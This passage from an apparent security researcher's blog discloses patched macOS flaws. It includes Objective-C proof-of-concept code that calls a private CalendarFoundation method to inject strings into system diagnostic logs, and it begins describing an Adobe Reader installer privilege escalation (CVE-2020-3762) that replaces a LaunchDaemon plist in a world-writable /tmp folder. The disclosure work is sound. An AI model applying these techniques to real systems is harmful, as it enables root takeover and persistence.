</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">logError:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">message:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">domain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg3</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">logError:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">message:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">domain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">uid:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg4</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">logException:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">message:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">domain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg3</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">log:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">domain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">signature:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">result:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg4</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">log:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">domain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">signature:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">result:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg4</span> <span style="color:#c0f">value:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg5</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">log:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">domain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">signature:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">result:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg4</span> <span style="color:#c0f">value:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg5</span> <span style="color:#c0f">summarize:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg6</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">log:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">domain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">signature:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">result:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg4</span> <span style="color:#c0f">value:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg5</span> <span style="color:#c0f">value2:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg6</span> <span style="color:#c0f">uid:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg7</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">log:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">domain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">signature:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">result:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg4</span> <span style="color:#c0f">value:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg5</span> <span style="color:#c0f">value2:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg6</span> <span style="color:#c0f">value3:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg7</span> <span style="color:#c0f">uid:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg8</span> <span style="color:#c0f">uid2:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg9</span> <span style="color:#c0f">wakeState:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg10</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">log:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">domain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">signature:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">signature2:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg4</span> <span style="color:#c0f">summarize:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg5</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">log:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">domain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">signature:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">summarize:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg4</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">log:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">domain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">summarize:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg3</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">traceWithDomain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">value:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">summarize:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg3</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">traceWithDomain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">signature:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">summarize:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg3</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">traceWithDomain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">signature:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">result:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg3</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">traceWithDomain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">signature:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">signature2:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">summarize:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg4</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">log:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">domain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">signature:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">signature2:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg4</span> <span style="color:#c0f">result:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg5</span> <span style="color:#c0f">value:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg6</span> <span style="color:#c0f">value2:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg7</span> <span style="color:#c0f">value3:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg8</span> <span style="color:#c0f">uid:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg9</span> <span style="color:#c0f">uid2:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg10</span> <span style="color:#c0f">wakeState:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg11</span> <span style="color:#c0f">summarize:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg12</span>;
</span></span><span style="display:flex;"><span>+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">messageTraceLogDomain:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withSignature:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@end</span>
</span></span></code></pre></div><p>What I left to do is create a code that will call the function in its simplest form. Did I say before that I hate the syntax of Objective-C and that I’m not an Apple developer? Patrick Wardle’s post: <a href="https://digitasecurity.com/blog/2019/01/22/pkgvalidation/"  class="external-link" target="_blank" rel="noopener">Reversing ‘pkgutil’ to Verify PKGs</a> came to the rescue. I remembered that he did something similar with <code>pkgutil</code> and he had a step by step walkthrough how to call an external function. Using his post, I created the following code to do the trick:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#099">#import &lt;dlfcn.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#099">#import &lt;Foundation/Foundation.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#099">#import &#34;CalMessageTracer.h&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span> argv[]) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">@autoreleasepool</span> {
</span></span><span style="display:flex;"><span>        NSLog(<span style="color:#c30">@&#34;Hello, World!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#078;font-weight:bold">void</span><span style="color:#555">*</span> tracer <span style="color:#555">=</span> <span style="color:#366">NULL</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#09f;font-style:italic">//load framework
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>        tracer <span style="color:#555">=</span> dlopen(<span style="color:#c30">&#34;/System/Library/PrivateFrameworks/CalendarFoundation.framework/Versions/Current/CalendarFoundation&#34;</span>, RTLD_LAZY);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span>(<span style="color:#366">NULL</span> <span style="color:#555">==</span> tracer)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#09f;font-style:italic">//bail
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>            <span style="color:#069;font-weight:bold">goto</span> bail;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#09f;font-style:italic">//class
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>        <span style="color:#078;font-weight:bold">Class</span> CalMessageTracerCl <span style="color:#555">=</span> <span style="color:#366">nil</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#09f;font-style:italic">//obtain class
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>        CalMessageTracerCl <span style="color:#555">=</span> NSClassFromString(<span style="color:#c30">@&#34;CalMessageTracer&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span>(<span style="color:#366">nil</span> <span style="color:#555">==</span> CalMessageTracerCl)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#09f;font-style:italic">//bail
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>            <span style="color:#069;font-weight:bold">goto</span> bail;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#09f;font-style:italic">//+ (void)log:(id)arg1 domain:(id)arg2 signature:(id)arg3 result:(int)arg4;
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>        [CalMessageTracerCl <span style="color:#99f">log</span>:<span style="color:#c30">@&#34;your message here&#34;</span> <span style="color:#99f">domain</span>:<span style="color:#c30">@&#34;com.apple.sleepservices.icalData&#34;</span> <span style="color:#99f">signature</span>:<span style="color:#c30">@&#34;CalDAV account refresh statistics&#34;</span> <span style="color:#99f">result</span>:<span style="color:#f60">0x0</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#99f">bail</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#555">-</span><span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This will create a log for you, and in the <code>log</code> parameter you can insert you custom string, thus injecting something useful to the ASL binary.</p>
<p>Unfortunately this is still not good enough for a direct <code>root</code> code execution, but you might have a use case where this might be enough, where there is some other item where this could be chained.</p>
<p>Also hopefully this gave you some ideas how to do some basic reverse engineering when you want to backtrace a function call, and possibly call it in your code.</p>
<p>This was fixed in Catalina 10.15.3, with file permissions changed:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>drwxr-x—  <span style="color:#f60">4</span> root             admin                 <span style="color:#f60">128</span> Dec <span style="color:#f60">21</span> 12:42 DiagnosticMessages
</span></span></code></pre></div><h3 id="adobe-reader-macos-installer---local-privilege-escalation-cve-2020-3762">
  Adobe Reader macOS installer - local privilege escalation (CVE-2020-3762)
  <a class="heading-link" href="#adobe-reader-macos-installer---local-privilege-escalation-cve-2020-3762">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>This is finally a true privilege escalation scenario. It&rsquo;s in the Adobe Reader&rsquo;s installer, related to the <code>Acrobat Update Helper.app</code> component. An attacker can replace any file during the installation and the installer will copy that to a new place. Replacing the LaunchDaemon plist file with our own, we can achieve root privileges, and also persistence at the same time.</p>
<p>When Adobe Reader is being installed it will create the following folder structure in the <code>/tmp/</code> directory which is writeable for all users:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls -lR com.adobe.AcrobatRefreshManager/
</span></span><span style="display:flex;"><span>total <span style="color:#f60">528</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">3</span> root  wheel      <span style="color:#f60">96</span> Jul <span style="color:#f60">31</span> 16:30 Acrobat Update Helper.app
</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#f60">1</span> root  wheel   <span style="color:#f60">80864</span> Jul <span style="color:#f60">31</span> 16:36 AcrobatUpdateHelperLib.dylib
</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">184512</span> Jul <span style="color:#f60">31</span> 16:36 AcrobatUpdaterUninstaller
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">3</span> root  wheel      <span style="color:#f60">96</span> Jul <span style="color:#f60">31</span> 16:35 Adobe Acrobat Updater.app
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Acrobat Update Helper.app:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">7</span> root  wheel  <span style="color:#f60">224</span> Jul <span style="color:#f60">31</span> 16:37 Contents
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Acrobat Update Helper.app/Contents:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">16</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">1778</span> Jul <span style="color:#f60">31</span> 16:29 Info.plist
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">3</span> root  wheel    <span style="color:#f60">96</span> Jul <span style="color:#f60">31</span> 16:37 MacOS
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel     <span style="color:#f60">8</span> Jul <span style="color:#f60">31</span> 16:29 PkgInfo
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">3</span> root  wheel    <span style="color:#f60">96</span> Jul <span style="color:#f60">31</span> 16:37 Resources
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">3</span> root  wheel    <span style="color:#f60">96</span> Jul <span style="color:#f60">31</span> 16:36 _CodeSignature
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Acrobat Update Helper.app/Contents/MacOS:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">776</span>
</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">393600</span> Jul <span style="color:#f60">31</span> 16:36 Acrobat Update Helper
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Acrobat Update Helper.app/Contents/Resources:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">8</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">1720</span> Jul <span style="color:#f60">31</span> 16:29 FileList.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Acrobat Update Helper.app/Contents/_CodeSignature:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">8</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">2518</span> Jul <span style="color:#f60">31</span> 16:36 CodeResources
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Adobe Acrobat Updater.app:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">6</span> root  wheel  <span style="color:#f60">192</span> Jul <span style="color:#f60">31</span> 16:37 Contents
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Adobe Acrobat Updater.app/Contents:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">16</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">2295</span> Jul <span style="color:#f60">31</span> 16:35 Info.plist
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">3</span> root  wheel    <span style="color:#f60">96</span> Jul <span style="color:#f60">31</span> 16:35 Library
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel     <span style="color:#f60">8</span> Jul <span style="color:#f60">31</span> 16:35 PkgInfo
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">3</span> root  wheel    <span style="color:#f60">96</span> Jul <span style="color:#f60">31</span> 16:37 Resources
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Adobe Acrobat Updater.app/Contents/Library:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">6</span> root  wheel  <span style="color:#f60">192</span> Jul <span style="color:#f60">31</span> 16:37 LaunchServices
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Adobe Acrobat Updater.app/Contents/Library/LaunchServices:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">728</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel     <span style="color:#f60">474</span> Jul <span style="color:#f60">31</span> 16:35 ARMNextCommunicator-Launchd.plist
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel     <span style="color:#f60">486</span> Jul <span style="color:#f60">31</span> 16:35 SMJobBlessHelper-Launchd.plist
</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">176000</span> Jul <span style="color:#f60">31</span> 16:35 com.adobe.ARMDC.Communicator
</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">184528</span> Jul <span style="color:#f60">31</span> 16:35 com.adobe.ARMDC.SMJobBlessHelper
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Adobe Acrobat Updater.app/Contents/Resources:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">480</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">244307</span> Jul <span style="color:#f60">31</span> 16:35 app.icns
</span></span><span style="display:flex;"><span>csabyworkmac:tmp csaby$ ls -lR com.adobe.AcrobatRefreshManager/
</span></span><span style="display:flex;"><span>total <span style="color:#f60">528</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">3</span> root  wheel      <span style="color:#f60">96</span> Jul <span style="color:#f60">31</span> 16:30 Acrobat Update Helper.app
</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#f60">1</span> root  wheel   <span style="color:#f60">80864</span> Jul <span style="color:#f60">31</span> 16:36 AcrobatUpdateHelperLib.dylib
</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">184512</span> Jul <span style="color:#f60">31</span> 16:36 AcrobatUpdaterUninstaller
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">3</span> root  wheel      <span style="color:#f60">96</span> Jul <span style="color:#f60">31</span> 16:35 Adobe Acrobat Updater.app
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Acrobat Update Helper.app:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">7</span> root  wheel  <span style="color:#f60">224</span> Jul <span style="color:#f60">31</span> 16:37 Contents
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Acrobat Update Helper.app/Contents:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">16</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">1778</span> Jul <span style="color:#f60">31</span> 16:29 Info.plist
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">3</span> root  wheel    <span style="color:#f60">96</span> Jul <span style="color:#f60">31</span> 16:37 MacOS
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel     <span style="color:#f60">8</span> Jul <span style="color:#f60">31</span> 16:29 PkgInfo
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">3</span> root  wheel    <span style="color:#f60">96</span> Jul <span style="color:#f60">31</span> 16:37 Resources
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">3</span> root  wheel    <span style="color:#f60">96</span> Jul <span style="color:#f60">31</span> 16:36 _CodeSignature
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Acrobat Update Helper.app/Contents/MacOS:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">776</span>
</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">393600</span> Jul <span style="color:#f60">31</span> 16:36 Acrobat Update Helper
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Acrobat Update Helper.app/Contents/Resources:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">8</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">1720</span> Jul <span style="color:#f60">31</span> 16:29 FileList.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Acrobat Update Helper.app/Contents/_CodeSignature:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">8</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">2518</span> Jul <span style="color:#f60">31</span> 16:36 CodeResources
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Adobe Acrobat Updater.app:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">6</span> root  wheel  <span style="color:#f60">192</span> Jul <span style="color:#f60">31</span> 16:37 Contents
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Adobe Acrobat Updater.app/Contents:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">16</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">2295</span> Jul <span style="color:#f60">31</span> 16:35 Info.plist
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">3</span> root  wheel    <span style="color:#f60">96</span> Jul <span style="color:#f60">31</span> 16:35 Library
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel     <span style="color:#f60">8</span> Jul <span style="color:#f60">31</span> 16:35 PkgInfo
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">3</span> root  wheel    <span style="color:#f60">96</span> Jul <span style="color:#f60">31</span> 16:37 Resources
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Adobe Acrobat Updater.app/Contents/Library:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">6</span> root  wheel  <span style="color:#f60">192</span> Jul <span style="color:#f60">31</span> 16:37 LaunchServices
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Adobe Acrobat Updater.app/Contents/Library/LaunchServices:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">728</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel     <span style="color:#f60">474</span> Jul <span style="color:#f60">31</span> 16:35 ARMNextCommunicator-Launchd.plist
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel     <span style="color:#f60">486</span> Jul <span style="color:#f60">31</span> 16:35 SMJobBlessHelper-Launchd.plist
